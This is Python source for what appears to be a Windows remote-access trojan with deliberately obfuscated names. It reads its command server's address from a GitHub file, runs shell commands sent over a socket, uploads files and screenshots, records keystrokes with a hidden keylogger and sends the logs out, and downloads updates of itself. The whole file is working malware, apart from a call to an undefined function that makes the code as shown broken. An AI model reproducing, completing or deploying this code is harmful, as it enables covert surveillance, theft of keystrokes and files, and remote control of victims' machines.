import subprocess,socket,time,requests,os,logging
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
hLKQGOwWiukdACWLjnGgu = ""
dQyIEaUbuUlxbywFJtSPRV = ""
QEkwlcWrDphshNLUfRx = "07.12.24.1"
kIpbfjqAiN = "!"
sPYcAlsNgQhfueeq = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
hdYsruWGuBeWxhCa = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
LOGGING_PATH = os.path.expanduser("~\\AppData\\Local\\")
def uJoYqMgLv(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def HfgqSLrXZuyhbKSiGxPq(s):
	HzUrvyIEQoLRK = s.recv(1024)
	if len(HzUrvyIEQoLRK)==0:
		return True
	kbsCeHqWJSlUKvVaeH = HzUrvyIEQoLRK.decode("utf-8").replace("\n","")
	if not kbsCeHqWJSlUKvVaeH.startswith(kIpbfjqAiN):
		proc = subprocess.run(kbsCeHqWJSlUKvVaeH, shell=True, capture_output=True)
		pOldtmSauDfzMFwBdqtigG = proc.stdout + proc.stderr
		s.send(pOldtmSauDfzMFwBdqtigG)
		return
	iaXWphsAbTGKblwf = kbsCeHqWJSlUKvVaeH.split(" ")[0][1:]
	if iaXWphsAbTGKblwf == "download":
		FtERaYJAHwPHwOJjLTE(s, kbsCeHqWJSlUKvVaeH)
	elif iaXWphsAbTGKblwf == "screenshot":
		RKmzRbp(s)
	elif iaXWphsAbTGKblwf == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif iaXWphsAbTGKblwf == "update":
		manualUpdate(s)
def FtERaYJAHwPHwOJjLTE(s, kbsCeHqWJSlUKvVaeH):
	aWGNNAyiSIL = kbsCeHqWJSlUKvVaeH.replace(kIpbfjqAiN+"download ","").split(",")
	pOldtmSauDfzMFwBdqtigGs = ""
	for f in aWGNNAyiSIL:
		pOldtmSauDfzMFwBdqtigGs += xJDmhwLBvRSQcNpRkzwG(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(pOldtmSauDfzMFwBdqtigGs, "utf-8"))
def RKmzRbp(s):
	UuDsQcorKCbvbHAijRk = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	qJbruqn = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	UuDsQcorKCbvbHAijRk.save(qJbruqn)
	UuDsQcorKCbvbHAijRk.close()
	r = xJDmhwLBvRSQcNpRkzwG(qJbruqn, "api/sscap")
	os.remove(qJbruqn)
	s.send(bytes(r,"utf-8"))
def xJDmhwLBvRSQcNpRkzwG(rGGqKAHfE, xTMjefoWoGQWoe, jAQqjSkvNZxBcu=None):
	if not os.path.isfile(rGGqKAHfE):
		return "[!] 404: "+rGGqKAHfE+"\n"
	headers = {"user":os.getlogin()}
	if jAQqjSkvNZxBcu is not None:
		headers = {**headers, **jAQqjSkvNZxBcu}
	requests.post("http://"+hLKQGOwWiukdACWLjnGgu+":5555/"+xTMjefoWoGQWoe,
		files={"file":open(rGGqKAHfE, "rb")},
		headers=headers)
	return "[+] 200: "+rGGqKAHfE+"\n"
def manualUpdate(s):
	h, p, v = getStartupInfo(True)
	if (v != QEkwlcWrDphshNLUfRx):
		update(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def update(uXRBlvwbgxaBtpSzLSz):
	aXIIXwzvgpyidmOOv = os.path.basename(__file__)
	fileType = aXIIXwzvgpyidmOOv.split(".")[-1]
	JfBitwAYApBPJgmbRZnYYLz = aXIIXwzvgpyidmOOv.split(".")[0]+"."+uXRBlvwbgxaBtpSzLSz+".pyw" if fileType.startswith("py") else ".exe"
	PAxyqFzxdHp = os.path.join(os.getcwd(), JfBitwAYApBPJgmbRZnYYLz)
	if not os.path.isfile(PAxyqFzxdHp):
		with open(JfBitwAYApBPJgmbRZnYYLz, "w+") as f:
			f.write(requests.get(hdYsruWGuBeWxhCa+"file."+ "pyw" if PAxyqFzxdHp.split(".")[-1].startswith("py") else "exe").text)
def getStartupInfo(force=False):
	global hLKQGOwWiukdACWLjnGgu, dQyIEaUbuUlxbywFJtSPRV
	if force or hLKQGOwWiukdACWLjnGgu == "" or dQyIEaUbuUlxbywFJtSPRV == "":
		HzUrvyIEQoLRK = requests.get(sPYcAlsNgQhfueeq).text.replace("\n","").split(":")
		hLKQGOwWiukdACWLjnGgu = HzUrvyIEQoLRK[0].strip()
		dQyIEaUbuUlxbywFJtSPRV = HzUrvyIEQoLRK[1].strip()
		uXRBlvwbgxaBtpSzLSz = HzUrvyIEQoLRK[2].strip()
	return hLKQGOwWiukdACWLjnGgu, dQyIEaUbuUlxbywFJtSPRV, uXRBlvwbgxaBtpSzLSz
def YWgOqXcNWgRaxCX():
	pass
def checkKeyLogs():
	try:
		logFileName = "settings.xpb"
		logFiles = sorted([file for file in os.listdir(LOGGING_PATH) if os.path.isfile(LOGGING_PATH+"\\"+file) and file.endswith(logFileName.split(".")[-1])])
		if logFileName in logFiles:
			logFiles.remove(logFileName)
		logFileFullPath = os.path.join(LOGGING_PATH,logFileName)
		if len(logFiles) > 0:
			with open(logFileFullPath, "ab+") as f:
				for file in logFiles:
					temp = os.path.join(LOGGING_PATH,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		xJDmhwLBvRSQcNpRkzwG(logFileFullPath, "api/log")
		if os.path.isfile(logFileFullPath):
			os.remove(logFileFullPath)
	except Exception as e:
		print(e)
		pass
def startKeyLogging():
	logging.basicConfig(filename=(LOGGING_PATH+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def logKey(k):
		logging.info(str(k))
	k=Listener(on_press=logKey)
	loggers = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in loggers:
		l.setLevel(logging.CRITICAL)
	k.start()
def CnpkbTYkjMqAkEtBhFF():
	h, p, v = VIaLpKpTUF()
	checkKeyLogs()
	YWgOqXcNWgRaxCX()
	if QEkwlcWrDphshNLUfRx != v:
		update(v)
	startKeyLogging()
	SRGiyBcRTnyKpcBMAmipxeU = bytes("["+QEkwlcWrDphshNLUfRx+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				XUCRZqnUYAUMBVHCq=False
				try:
					s=uJoYqMgLv(h, p)
					while not XUCRZqnUYAUMBVHCq:
						s.send(SRGiyBcRTnyKpcBMAmipxeU)
						XUCRZqnUYAUMBVHCq=HfgqSLrXZuyhbKSiGxPq(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
CnpkbTYkjMqAkEtBhFF()